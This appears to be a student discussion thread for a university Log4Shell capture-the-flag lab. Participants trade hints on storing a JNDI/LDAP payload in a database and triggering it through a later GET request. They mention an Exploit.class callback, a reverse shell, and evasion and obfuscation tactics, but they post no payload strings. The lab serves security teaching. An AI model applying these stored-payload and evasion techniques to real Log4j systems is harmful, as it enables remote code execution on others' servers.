I have use post method to save data in the database, and use get method to fetch the data. It can hit the LDAP server and run the Exploit.class file. But the problem is it shows Flag not obtained due to failed attempt. JNDI malicious must come from data at rest. 

I inject the malicious payload on Post method, this will trigger hitting the LDAP server as well. I am not sure my error is related to this or not. The Get api I use also can hit the LDAP server but showing the flag error instead of showing me correct flag code. 


Reply

Ruangsak Patomwong
1w
I think I stuck at the same point.


Reply

Kevin Darlington
1w
This is a hint to let you know that you need to approach this flag differently. You need to think about data at rest and how you can leverage that. 


Reply

Xiaohua Cai
1w
But I already send a post and store the information in the database and then send a get method to fetch information from server. so this does not count as data at rest? 


10
Reply

Ruangsak Patomwong
1w

Resolved
How to craft the payload since GET endpoint do not process any value that we POST? and null value that we can modify we edit that from curl not from the rest data itself.


Reply

Ruangsak Patomwong
1w
Please give me some hint. I'm stuck on this for 3 days and go to nowhere.


Reply

Kevin Darlington
1w
Think about data at rest and how you can leverage that for this flag. This flag is very different than the rest for this reason. 


Reply

Ruangsak Patomwong
1w

Resolved
I think I can trigger the script when POST new data but not when I GET the data.


Reply

Kshitij Gupta
1w
Are you using the right endpoint? Did you try everything?


Reply

Ruangsak Patomwong
1w
I know that GET has a special value that can be modified to trigger the script but it is not the intension of this flag. It must be normal call. How can GET execute script if it not read any value but directly log them to sql data?


Reply

Ashutosh Agarwal
1w
The exploit must be triggered via data stored in the database (data at rest). If your POST request is triggering the LDAP server, it indicates that the payload is being executed too early. Ensure the POST request only persists the payload without executing it. Then use the correct GET endpoint to retrieve the malicious data from the database and trigger the exploit.


Reply

Omar Arin Solaiman
2w

Resolved
Running into issue where my exploit runs from... one part of the data as opposed to many?

But when I check the log syntax, the executable part looks exactly the same?


Reply

Omar Arin Solaiman
2w
I figured it out

Do not over-complicate your obfuscation. 


1
Reply

Caleb Ryan Massengill
1w
This was helpful, but don't read this as "You don't need to do any obfuscation to make this work."  I had to do some obfuscation, but significantly less than in previous flags.

Overall, I think this is the most satisfying/entertaining flag. Once you figure out the correct way of passing the data so that the exploit can execute from data at rest, it turns into a bit of a puzzle, which I loved. 

Another note here, my exploit still executed when I posted the data, so don't let that throw you off if it does. In my case, it still worked when I called the correct endpoint, even though it triggered the exploit when I did my POST as well.


1
Reply

Hailey Robinson
1w
 Replying to Caleb Ryan Massengill
I second this!! I spent far too long worrying about triggering the exploit in only one place when it did not seem to matter


Reply

Mason Lunsford
1w
Just got this flag as well - ended up spending waaay too much time on it. For anyone still stuck on it, I'll echo what @Omar said and go further and say that even if the lookup is being executed properly and from the right location, the way you obfuscated it may still be hindering you from getting the flag.


Reply

Yan Ting Liu
1w
I highly recommend this thread for people like me who have been stuck for a long time. I tried various approaches and even discovered a hidden variable in the POST request that could trigger the Log4j vulnerability, but it turned out there wasnt for any hidden point. Make sure to "double check your payload like they mentioned"—it's not a good one, to be honest, even if your payload successfully hitting correctly from data at rest.


1
Reply

Omar Arin Solaiman
2w

Resolved
I am definitely seeing it run from resting data via the get/query I'm utilizing...

But the flag isn't coming, even with the file being updated. Using the end result of Flag2, I am able to see that the config file has the relevant updated id after running. 


Does the get used HAVE to be the ONE specific one? Because the other is definitely doing it.

I will say I think my method has resulted in it running twice... I should fix that.


Reply

David Dexter
2w

Resolved
How can we update a product? Running curl -X POST 'http://localhost:8080/rest/products/product/a06524fb-....' gives me a 415 error


Reply

Anonymous Ibex
2w
Id should be part of request body


Reply

Kshitij Gupta
2w

Resolved
Is there any other endpoint we have to use other than the four we have been provided with? I assume no, but thought may check.


Reply

Ruangsak Patomwong
2w

Resolved
I can understand how this flag should work but I cannot get past the teapot when POST new record.


Reply

Anjali Chablani
2w
same.


Reply

Ruangsak Patomwong
2w
Find a way to put the data in but I cannot trigger the script with GET.


Reply

Ruangsak Patomwong
2w
And my email in the created data is keep changing to default when I use one of the GET method. 


Reply

Anonymous Ibex
2w

Resolved
Any guidance on "Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest"?

I have inserted a malicious record with an LDAP call using POST and I am also able to add product.id to config.properties with the GET call. I have followed the same steps as other tasks in the assignment.


Reply

Anonymous Penguin
2w
Pretty much in the same spot. I don't know why I would get that specific error when it is actually executing from data at rest.


Reply

Anonymous Crocodile
2w
In the same boat.


Reply

Anonymous Crocodile
2w
Just figured it out. In my case, my payload that I was storing in the database was being triggered way too many times when I called the "GET" method. My suggestion is to look at the body of the "POST" method and see how you can use those parameters to form your payload. Viewing the output from the logs also hints at this.


3
Reply

John Michael McPhillips
2w
 Replying to Anonymous Crocodile
Thanks, this helped for me too.


Reply

Omar Arin Solaiman
2w
 Replying to John Michael McPhillips
I figured out the location... but I can't get it to run it even when the string looks exactly the same. Fall into the same problem?


Reply

Anonymous Badger
1d
 Replying to Omar Arin Solaiman
I am at this point any tips?


Reply

Omar Arin Solaiman
1d
 Replying to Anonymous Badger
https://edstem.org/us/courses/69023/discussion/6222726?comment=14479901


Reply

Nicolas Bautista
1w
 Replying to Anonymous Crocodile
Yeah this helped a lot. Thank you.


Reply

Christopher Troupe
1w
 Replying to Anonymous Crocodile
Can you or someone elaborate on this? I see that I trigger the exploit and it happens a lot, but I'm not sure why it triggers multiple times or how to trigger it once. 

Edit: Triggering multiple times did affect me getting the flag at all, this was a time wasting red herring for me. 


Reply

Philipp Werner
2w

Resolved
I think I am close, but I'm not sure... I believe I have the correct statements to insert my payload into the database. However, when I make the GET request, neither of my servers is triggered. Do I need a different approach to execute the payload? I'm struggling with this...


1
Reply

Kshitij Gupta
2w
Same!


Reply

Philipp Werner
2w
I solved it. My fault was that I used the wrong endpoint...


2
Reply

Ruangsak Patomwong
2w
 Replying to Philipp Werner
How did you pass the teapot when you post new data?


Reply

Anonymous Eland
2w
 Replying to Ruangsak Patomwong
Some of the learning resources circulated have good info on evasion tactics.


Reply

Kavish Desai
2w
 Replying to Ruangsak Patomwong
I am not sure if I did it the way it was supposed to be meant but I didn't perform any evasion and it worked just fine


Reply

Kshitij Gupta
2w
 Replying to Kavish Desai
This is the hint that help me get on the right track and solve the flag. 

Definitely not an easy flag if you are on the wrong track. I followed all the hints of looking through the logs and tried several tactics but in the end the simplest way as mentioned above helped me get it. 


1
Reply

Joel M Tucker
2w
 Replying to Kshitij Gupta
nice job!


1
Reply

Michael Derryberry
2w
 Replying to Kshitij Gupta
Yes I am having a bad time with this one, It's been the hardest flag of the course so far for me. I feel that's because I am doing what you're describing: being on the wrong track. Unfortunately it's very hard to determine whether or not I'm on the wrong track. But are you saying removing evasion/obfuscation actually helped you here? As far as I can tell you need some form of obfuscation for the POST request.


Reply

Kavish Desai
2w
 Replying to Michael Derryberry
Think of different ways of how you can send your payload and I would suggest carefully looking at the Log when you send your post request to see whats happening in the application and how your POST request is processed. 


Reply

Kshitij Gupta
2w
 Replying to Michael Derryberry
There is a way. But keeping an eye on which tactic makes it hit the server helped me.


Reply

Lewis Won
1w
 Replying to Philipp Werner
This tip is super important!


1
Reply

Kshitij Gupta
2w

Resolved
I am able to leak out the java version but when I try to leakout the payload the attribute containing the payload does not get logged and there is no error message as well, so I am a bit confused as to what may be the error. Everything else other than the payload gets logged or has a geniune error message. I am a bit lost here if this is expected or I need to just reboot my machine. Thanks!


Reply

John Michael McPhillips
2w

Resolved
I don't understand the objective of this flag. We are creating a malicious product entry, which would trigger our exploit? In the example given that doesn't seem to be the case. The exploit would then inject the product.id of the product we already created, and the product we are calling? I've read this several times and none of makes sense to me. There is also a way to trigger the exploit that is identical to flag3, so why would we need to use malicious code within the product details to execute the exploit? Very confusing what is supposed to be done here.

Are we trying to redirect any product GET to the product values of the new product we created?  What is the goal?


Reply

Patrick Jacobs
2w
We are creating a malicious product entry, which would trigger our exploit? 
Yes, per:

Use the product POST endpoint to persist a record to the database that, when retrieved later, will trigger the LDAP call.
I agree that at first glance, the flag seems to get to the exploit in a roundabout way, but try to focus on one thing at a time:

Use the product POST endpoint to persist a record to the database ...
... update the “config.properties” file saved in the root directory of the application ...
... upon calling the right GET endpoint, it will trigger the exploit and, if successful, will generate the Flag 6 message in the logs.
These are three distinct steps.

why would we need to use malicious code within the product details to execute the exploit?
You won't be able to get the flag using any other mechanism than using a record in the DB:

When the application fetches the record upon calling the right GET endpoint, it will trigger the exploit and, if successful, will generate the Flag 6 message in the logs.

Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

6
Reply

Joel M Tucker
2w
Endorsed
nice, I really can't add anything else


2
Reply

Patrick Jacobs
1w
Endorsed
 Replying to Joel M Tucker


12
Reply

Kevin Darlington
1w
 Replying to Patrick Jacobs
LOL


1
Reply

Omar Arin Solaiman
2w

Resolved
Little confused between the errors and the flag description

Errors say I should worry about the customer.service.email property 

However the flag says "You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated."

I already know one vector, and I think I know the vector to uitilize the data at rest... But it's confusing what should be doing what?

Is the goal for us to have data at rest that we call that then triggers the exploit update? And that exploit updates the product.id, not the customer.service.email?


1
Reply

Ashutosh Agarwal
2w
Yes, the goal is to have data at rest (stored in the database) that, when retrieved via a GET request, triggers the exploit. The exploit should update the product.id property in the config.properties file with the malicious product's ID—not the customer.service.email.


Reply

Kshitij Gupta
2w

Resolved
When I create a new product via POST /rest/products/product, I include an email in the request.
 
When I retrieve the product using GET /rest/products/product?email=example@example.com, the email is correctly returned with the product attributes

 However, when I retrieve the same product using GET /rest/products/product/<id>, the email does not persist and appears to be missing or reset to a default value.

Before proceeding further with this flag, do I need to ensure the email persists correctly in GET by ID, or can I move forward despite this issue? A 


Reply

Abhishek Sathiabalan
2w
Move forward.


4
Reply

Gen Sheng Zhang
2w

Resolved
Great flag once it clicks. There should only be one GET that works, read the logs carefully about where you want the exploit to happen, which is the key thing for most of the flags tbh. 


1
Reply

Arianna Rachel Lanz
2w
Any other hints here? I'm pretty sure I see where the exploit is supposed to happen based on the logs from the POST request and the logs from one of the GET requests. Still, when I call the GET request, I see the HTTP server and my exploit file being hit multiple times...


1
Reply

Gen Sheng Zhang
2w
I think being hit multiple times is not a concern, as long as the exploit is called at a certain point in the log and subsequently does the properties change as required, you can still get the flag.


1
Reply

Abhishek Sathiabalan
2w
It can be a concern, if you modify the file multiple times


1
Reply

Yongmin Li
2w
 Replying to Abhishek Sathiabalan
I think this is one of the key concerns


Reply

Anonymous Eland
2w
Are you sure? I was able to get my exploit to work on multiple GET endpoints.


Reply

Gen Sheng Zhang
2w
A true genius in that case, would love to learn how someday :)


Reply

Yongmin Li
2w

Resolved
i keep the Reverse Shell open during this flag, after execute the request and payload, the config.properties was updated as below
cat config.properties
#Mon Feb 24 06:44:28 GMT 2025
customer.service.email=example@example.com
topic.name=user.info
rating=PG
product.id=5f84925f-32b5-4717-8017-2273ef550b77

but i am still getting below error


WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.


Reply

Abhishek Sathiabalan
2w
Are you hard coding the datetime?


Reply

Yongmin Li
2w
No.


Reply

Yongmin Li
2w
Finally get the flag, I think I was misleading by "the real world vulnerability" again. test is test, they are deliberately designed.

My hint is pay CLOSE attention to all the output logs, then think , what might be some technic they want us to learn.

The error messages are also kind of hint. think why those error message are in place?
by error messages,  i don't mean below

Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it

WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

1
Reply

Joel M Tucker
2w
Yes, while we try to make these projects as "real world" as possible, they are deliberately designed to work in certain ways that highlight different aspects of the vulnerabilities. And yes, error messages are also designed to be helpful 


1
Reply

Cooper Michael Simpson
1w
How did you overcome WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it. ??

I feel like I know what to do for the flag but I keep getting this


1
Reply

Michael Derryberry
2w

Resolved
I seem to be dancing between multiple errors while attempting different endpoints. 
It's either: WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

OR:
 the customer.service.email property is not in config.properties OR overwriting file instead of updating it

I've spent most of my day on this flag so I must be missing something or we are
not getting enough guidance on this task.


3
Reply

Anonymous Penguin
2w
Same.


Reply

Abdelrahman Ibrahem
2w
You’re just missing some glaring issue that’s staring you right in the face. I don’t think there is any missing guidance; the error messages could be improved a bit, though. I believe this task is what cemented my understanding of Log4j vulnerabilities.


1
Reply

Anonymous Penguin
2w

Resolved
I am saving the exploit on the database. I don't know if we are supposed to create the new property as the exploit from the data at rest or if we are supposed to make another exploit for the data at rest. I am asking because there are different ways to trigger log4shell on this flag. There is a out of place variable and there is data at rest. Are we supposed to use both? also it triggers the exploit when I create a product so that's another different way of exploit. I already receive the Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest when coming from data at rest. So please I would like to know what am I doing wrong :)

thanks


Reply

Ashutosh Agarwal
2w
Focus on the data-at-rest attack vector. The goal is to store a malicious payload in the database and retrieve it later to trigger the exploit. The "out-of-place variable" is not relevant for this flag.


1
Reply

Anuj Goel
1w
Can you help in informing if we need to use just one variable or more than one?

Also, I am seeing the code that generates the flag is only executed on one API that does not seem to process variables. What am I missing? 


Reply

Kevin Darlington
1w
 Replying to Anuj Goel
There will only be 1 attack vector per se, but you really need to think about your payload, how the app stores data, how it retrieves data etc. This is a completely different thought process than all the other flags. 


Reply

Anuj Goel
1w
 Replying to Kevin Darlington
I have the payload that is executing the exploit on both posts and get, but I still don't get the flagged. I am confused as to why. The instructions say we need to add a new product id to the config.properties file. However, the log message says's 

WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.

What is going on?

In previous flags, the error message and instruction were aligned. How can I be sure that my exploit code it making the correct changes that Flag is expecting?


Reply

Fatima Muhammad Barakzai
2w

Resolved
I am confused about what we're supposed to be doing for this flag. I added the product.id entry into the properties file, but i'm seeing this in the logs:


Flag not obtained due to failed attempt, 
the customer.service.email property is not 
in config.properties OR overwriting file instead of 
updating it

4
Reply

Fatima Muhammad Barakzai
2w
I can see the email tho, am I supposed to change it?


1
Reply

Daniel James Poulin
2w
Did you get anywhere with this one? I am able to update the product email with a query. I found another endpoint with something similar to Flag5 so I can trigger a call back and overwrite or append whatever I want to the filesystem. I added the product.id and updated the customer.service.email. I am not sure what else we are supposed to be doing.


1
Reply

Fatima Muhammad Barakzai
2w
 Replying to Daniel James Poulin
nope, I feel like the requirements are super unclear on this one. I'm also able to manipulate the file system but aside from product.id i'm not sure what else i'm supposed to be doing with it

were we supposed to update the product email? 


3
Reply

Daniel James Poulin
2w
 Replying to Fatima Muhammad Barakzai
I think the key part from the write up is:

"When the application fetches the record upon calling the right GET endpoint, it will trigger the exploit"

So the you have the LDAP query in place before hand and you have to trigger this one via the GET request using the email property, no other way.

And the exploit being "You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated."


Reply

Fatima Muhammad Barakzai
2w
 Replying to Daniel James Poulin
I'm using a different way to trigger the LDAP query, but it does add the new product.id


Reply

Fatima Muhammad Barakzai
2w
 Replying to Daniel James Poulin
I feel like I understand all the concepts, just don't don't know what they want us to do 


1
Reply

Daniel James Poulin
2w
 Replying to Fatima Muhammad Barakzai
I am using a similar method as Flag5. I think that is the issue, it's not the email property triggering it.


1
Reply

Abdelrahman Ibrahem
2w
 Replying to Daniel James Poulin
I made a script that loops over everything I can set and monitored the log file for a leak.

I quickly found the set and get endpoints.

Another tip is to break it down into small steps. Make sure you’re hitting the correct endpoints by first trying to leak the Java version, then focusing on getting your exploit code running, and finally modifying what needs to be changed.


3
Reply

Daniel James Poulin
2w
 Replying to Abdelrahman Ibrahem
I think there is a specific way they want it triggered. I just got it to return my persisted email but I received this:

WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest


6
Reply

Arianna Rachel Lanz
2w
 Replying to Daniel James Poulin
I've found that after I make a POST with my exploit code when I call each of the GET endpoints: 
- one returns WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest
- another returns Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it
- and the third doesn't trigger the exploit at all

I'm not super stuck yet, but I just thought I'd share in case others are seeing the same thing!

🤷‍♀️ 


6
Reply

Daniel James Poulin
2w
 Replying to Arianna Rachel Lanz
I am at the same point. I think it's something to do with timing or order of operations. Just need to figure it out.


Reply

Arianna Rachel Lanz
2w
 Replying to Daniel James Poulin
I also just noticed something in the logs that may be useful.


Reply

Fatima Muhammad Barakzai
2w
 Replying to Arianna Rachel Lanz
any hints? Still stuck on this one


Reply

Abdelrahman Ibrahem
2w
 Replying to Daniel James Poulin
This message was a bit confusing for me too, I don’t think how it’s being triggered is the issue as much as it’s what is being triggered.


Reply

Fatima Muhammad Barakzai
2w
 Replying to Abdelrahman Ibrahem
Did you get the flag this way?


Reply

Abdelrahman Ibrahem
2w
 Replying to Fatima Muhammad Barakzai
Yes, but the key is step by step and really monitor how your payload impacts the logs.


1
Reply

Daniel James Poulin
2w
 Replying to Abdelrahman Ibrahem
Still stuck. I was using a method similar to Flag3 and modifying the URL to reach out to the LDAP server but I assumed that wasn't going anywhere since it says it needs to be triggered by data at rest.

I can do what the write up says and persist a record in the database and when I retrieve it using one of the GET methods, I see it query the LDAP server but I keep getting the "JNDI malicious trigger must come from data at rest" which.... it is. Not sure where to go from here.


2
Reply

Abhishek Sathiabalan
2w
 Replying to Daniel James Poulin
Have you verified your code isn't executing multiple times? Are you passing a JNDI in the parameters?


1
Reply

Fatima Muhammad Barakzai
2w
 Replying to Abhishek Sathiabalan
Do we pass it into the parameters or in the body?


Reply

William David Done
2w
 Replying to Daniel James Poulin
I'm stuck on this same step... even though the JNDI statement is coming from the database, it has the "JNDI malicious trigger must come from data at rest" error.


1
Reply

Daniel James Poulin
2w
 Replying to William David Done
Finally got it. All I will say is I didn't spend enough time looking at the POST logs.


4
Reply

William David Done
2w
 Replying to Daniel James Poulin
Thank you for the hint - that did it for me!


Reply

Kshitij Gupta
2w
 Replying to Daniel James Poulin
I understand the concept here, but I am still stuck at "Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it." I am a bit confused as to how to persist the email. I have looked at flag 3 and I am trying to follow the same line of thought for config.props


Reply

Anonymous Eland
2w
 Replying to Kshitij Gupta
I would look at the output from your python HTTP server and confirm whether or not it's serving your exploit file. If it is, then that message is probably because you're overwriting that file improperly as the message suggests. If it's not, then obviously your code isn't triggering to begin with.


2
Reply

Anonymous Eland
2w
 Replying to Kshitij Gupta
As far as the payload goes, hopefully without giving away too much, look carefully at what's being written to the database and how it looks when it's read from it. See if there's anything you can take advantage of.


2
Reply

Robert Smithers III
2w
 Replying to Daniel James Poulin
I'm still stuck with the "JNDI malicious trigger must come from data at rest" warning, but I'm fairly confident that I crafted the payload correctly. I reviewed the post logs, but I assume that just clarifies how to build it. 

I am not passing anything to directly cause the JNDI callback other than the payload stored in the database... am I missing something more?


1
Reply

Rodrigo Alvarado Chacon
2w
 Replying to Robert Smithers III
I am in the same boat as you, I am definetly running the payload from the database calling the specific endpoint. I don't what else I should try


1
Reply

Arianna Rachel Lanz
2w
 Replying to Daniel James Poulin
I’m pretty sure I see how to construct the exploit in the POST payload from looking at the POST logs, and my exploit is definitely triggered this way when using one of the GETs that reads the key value, and yet I still see the above errors. :/ 


Reply

Anonymous Eland
2w
 Replying to Arianna Rachel Lanz
The payload you craft should work for both of the GETs, if only one of them is triggering, you should take a look at how you're crafting it to see if you can get it to trigger for the other one.

Another hint: look carefully at what's being written to and read from the database, especially as pertains to the logs (obviously, since this is log4j and all). See if there's anything you can leverage to help craft your payload.


Reply

This comment was deleted
Arianna Rachel Lanz
2w
 Replying to (Deleted)
I don't know  what exactly I did differently, but I got it! I think I was relying on some of the other evasion tactics we used earlier, but they weren't necessary/hindered this exploit. 


5
Reply

Joseph A Cannaday
2w
 Replying to Arianna Rachel Lanz
Thank God you said this. 11+ hours on one flag and it was something so trivial. I hate my life.


2
Reply

Michael Derryberry
2w
 Replying to Joseph A Cannaday
I've been at this flag for so long now and I'm just going in circles. Even after sleeping and coming back the next day I'm still against a wall. Do you have any tips or hints that might be able to help?


Reply

Joseph A Cannaday
2w
 Replying to Michael Derryberry
Look at the logs to see how a lookup might be constructed and see Arianna's comment about evasion tactics. That's all I can say.


2
Reply

Anonymous Penguin
2w
 Replying to Joseph A Cannaday
Thanks a lot! I would say that it really doesn't make sense if  you are doing it right cause it's really making the exploit :( lost hours on this when it was working correctly just because I sent a different jndi payload


Reply

Robert Smithers III
1w
 Replying to Arianna Rachel Lanz
This solved it for me too! Not sure why a valid payload fails with evasion... likely some grading regex. Cheers


1
Reply

Michael Joseph Hearn
1w
 Replying to Robert Smithers III
Ahh yes we love when the grader failing means hours of extra work. 


3
Reply

Robert Birk Hughes
1w
 Replying to Robert Smithers III
So you just had to change the method in which you evaded the lookup checks and it worked for you?


Reply

Christopher Troupe
1w
 Replying to Arianna Rachel Lanz
I can't believe I wasted 5+ hours on this and this was the issue. Thank you! For anyone else, please save yourself your sanity and look at Arianna's comment. 


Reply

Van Hien Tran
5d
 Replying to Arianna Rachel Lanz
Hi, I still don't get it. I think I know how the payload should be based on the POST log, just not sure if I need to make it like how we passed it to the header in Flag 2. Sorry, English is not my mother tongue so i might misinterpreted the evasion tatics ... could you point to which flag using it?


[UPDATE] i got it thanks


Reply

Himanshu Singh
2d
 Replying to Van Hien Tran
What did you do? I'm constructing the payload through the POST logs but I am not sure how to retrieve it..


Reply

Himanshu Singh
2d
 Replying to Himanshu Singh
I got it, nevermind.


Reply

Abhishek Sathiabalan
2w
 Replying to Abdelrahman Ibrahem
Thanks, that made it click.


Reply

Amr Khaled Hassan
7d
 Replying to Abhishek Sathiabalan
Wow! This really was the issue after all


Reply

John Wyatt Gamble
3d
 Replying to Amr Khaled Hassan
This flag got me like:



1
Reply

Amrut Bhalchandra Kulkarni
5h
 Replying to John Wyatt Gamble
Just got Flag 6 and... y'know... same

I was doing roughly the same thing for a few hours, and I apparently changed something correctly since the flag showed up

Also, Between POST and GET, the random change meant that instead of the exploit being called 8 times per endpoint call, it would only be called 2 ties per call

So... still not sure... the logs look the same, but how I formatted the payload changed


Reply

This comment was deleted
Keymer Botero
2d
If your servers aren't firing, it means that your exploit is not getting triggered. Look into different ways how you can make that bad boy fire!

This may sound obvious, but trust me, this hint was a lifesaver thoroughout the project timeline for me.


Reply



FLAG7-END



